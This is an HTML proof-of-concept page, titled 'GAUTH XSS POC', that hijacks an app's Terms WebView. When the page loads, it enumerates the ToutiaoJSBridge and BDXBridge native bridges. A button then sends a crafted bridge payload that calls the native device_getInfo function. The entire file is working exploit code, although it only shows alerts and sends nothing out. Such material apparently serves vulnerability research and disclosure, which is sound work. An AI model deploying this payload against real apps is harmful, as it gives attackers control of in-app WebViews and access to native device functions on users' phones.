<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>GAUTH XSS POC</title>
  </head>
  <body>
    <h1>GAUTH XSS POC</h1>
    <p>If you see this inside the app, this page hijacked the Terms WebView.</p>

    <button onclick="doBridge()">Test native bridge</button>

    <script>
      alert("WebView controlled");

      function listBridges() {
        var msg = [];
        if (window.BDXBridge) msg.push("BDXBridge");
        if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");
        alert("Available bridges: " + (msg.join(", ") || "none"));
      }

      function doBridge() {
        try {
          // Typical ToutiaoJSBridge payload structure seen in the wild
          var payload = {
            "__callback_id": "0",
            "__msg_type": "call",
            "func": "device_getInfo",   // example native func name
            "params": {}
          };

          if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
            ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
            alert("Sent invokeMethod(device_getInfo)");
          } else if (window.BDXBridge && BDXBridge._invokeMethod) {
            BDXBridge._invokeMethod(JSON.stringify(payload));
            alert("Sent _invokeMethod(device_getInfo)");
          } else {
            alert("No bridge methods found");
          }
        } catch (e) {
          alert("Bridge call error: " + e);
        }
      }

      // Run on load
      setTimeout(listBridges, 1500);
    </script>
  </body>
</html>
